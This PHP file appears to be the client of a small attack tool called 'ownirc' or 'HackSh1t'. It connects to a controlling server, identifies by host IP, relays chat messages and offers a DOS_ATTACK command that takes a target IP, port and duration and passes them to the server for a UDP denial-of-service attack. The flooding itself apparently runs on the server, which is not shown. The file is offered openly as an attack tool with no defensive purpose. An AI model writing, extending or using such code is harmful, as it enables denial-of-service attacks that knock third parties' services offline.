<?php //client.php
if(!file_exists('./client.conf.php')){
	die('ERROR: Can\'t find client config.');
}
define('client', TRUE);
require './client.conf.php';

$socket = fsockopen($client['server'], $client['port'], $errno, $errstr);
if(!$socket){
	echo "$errstr ($errno)\r\n";
}else{
	fwrite($socket, 'IDENTIFY '.gethostbyname(gethostname())."\r\n");
	while(is_resource($socket)){
		$data = trim(fread($socket, 1024));
		echo $data."\n";
		$d = explode(' ', $data);
		$d = array_pad($d, 10, '');

		if($d[0] == 'ERROR'){
			switch($d[1]){
				case 'banlist':
					die('You\'re on our banlist, unable to connect.'."\r\n");
				
				case 'not_online':
					echo 'The user you\'re trying to reach is not online.'."\r\n";
				
				case 'ip':
					echo 'Give the server a valid IP to attack, please.'."\r\n";
				
				case 'port':
					echo 'Invalid port, randomising.'."\r\n";
			}
		}
		
		if($d[0] == 'WELCOME'){
			echo 'Welcome to ownirc, this is your username: '.gethostbyname(gethostname())."\r\n";
		}
		
		if($d[1] == 'MSG'){
			$count = count($d);
			$i = 2;
			$message = '';
			for($i;$i<$count;$i++){
				$message = $message.' '.$d[$i];
			}
			echo $d[0].': '.$message."\r\n";
		}else{
			echo "\n";
			echo 'Commands:'."\r\n";
			echo 'DOS_ATTACK <ip> <port> <time> //UDP DoS Attack'."\r\n";
			echo 'QUIT //quit HackSh1t (server will quit too for some reason)'."\r\n>";
			$input = fopen('php://stdin', 'r');
			$command = trim(fread($input, 1024));
			
			$dd = explode(' ', $command);
			$dd = array_pad($dd, 10, '');
			
			if($dd[0] == 'DOS_ATTACK'){
				echo 'Querying attack to server...'."\r\n";
				echo "\n";
				fwrite($socket, $dd[0].' '.$dd[1].' '.$dd[2].' '.$dd[3]."\r\n");
			}elseif($dd[0] == 'QUIT'){
				fwrite($socket, 'QUIT'."\r\n");
				exit;
			}else{
				echo 'Invalid command; '.$dd[0]."\r\n";
			}
		}
	}
}